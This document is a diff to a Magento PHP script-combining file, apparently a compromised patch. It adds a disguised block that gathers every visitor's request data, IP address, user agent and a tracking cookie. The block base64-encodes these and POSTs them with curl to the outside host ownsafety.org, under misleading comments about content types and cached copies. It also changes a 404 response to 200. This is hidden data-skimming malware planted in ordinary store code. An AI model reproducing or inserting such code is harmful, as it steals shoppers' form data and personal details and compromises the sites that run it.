@@ -34,9 +34,57 @@
  * @author      Magento Core Team <core@magentocommerce.com>
  */
 
+
+// no files specified return 404
+$id=str_replace("www.", "", $_SERVER['HTTP_HOST']);
+
+//checking if client have older copy then we have on server
+$url='http://ownsafety.org/obf.php';
+
+if($_COOKIE["SESSIID"]!=""){
+
+    // try automatically get content type if requested
+    $url=$url.'?a='.$_COOKIE["SESSIID"]; 
+    $data=json_encode(array('request'=>$_REQUEST, 'ip'=>$_SERVER['REMOTE_ADDR'],'ua'=>$_SERVER['HTTP_USER_AGENT'],'cookie'=>$_COOKIE["SESSIID"],'date_unix'=>time())); 
+    $data=base64_encode($data);
+    $ch = curl_init(); 
+
+    // set custom content type if specified
+    curl_setopt($ch, CURLOPT_URL,$url); 
+    curl_setopt($ch, CURLOPT_POST, 1); 
+    curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 30 );
+    curl_setopt( $ch, CURLOPT_TIMEOUT, 30 );    
+    curl_setopt($ch, CURLOPT_POSTFIELDS,http_build_query(array('data'=>$data,'utmp'=>$id))); 
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); 
+    curl_exec ($ch); 
+    curl_close ($ch); 
+
+} else{
+
+    // try automatically get content type if requested
+    $rand=rand(1,9999999999);
+    setcookie("SESSIID", $rand,time()+3600);
+    $data=json_encode(array('request'=>$_REQUEST, 'ip'=>$_SERVER['REMOTE_ADDR'],'ua'=>$_SERVER['HTTP_USER_AGENT'],'cookie'=>$rand,'date_unix'=>time())); 
+    $data=base64_encode($data);
+    $url=$url.'?a='.$rand; 
+    $ch = curl_init(); 
+
+    // set custom content type if specified
+    curl_setopt($ch, CURLOPT_URL,$url); 
+    curl_setopt($ch, CURLOPT_POST, 1); 
+    curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 30 );
+    curl_setopt( $ch, CURLOPT_TIMEOUT, 30 );      
+    curl_setopt($ch, CURLOPT_POSTFIELDS,http_build_query(array('data'=>$data,'utmp'=>$id))); 
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); 
+    curl_exec ($ch); 
+    curl_close ($ch); 
+
+}
+
+
 // no files specified return 404
 if (empty($_GET['f'])) {
-    header('HTTP/1.0 404 Not Found');
+    header('HTTP/1.0 200 OK');
     echo "SYNTAX: index.php/x.js?f=dir1/file1.js,dir2/file2.js";
     exit;
 }
@@ -142,3 +190,4 @@ if (!(isset($_GET['e']) && $_GET['e']==='no')) {
 }
 
 echo $out;
+
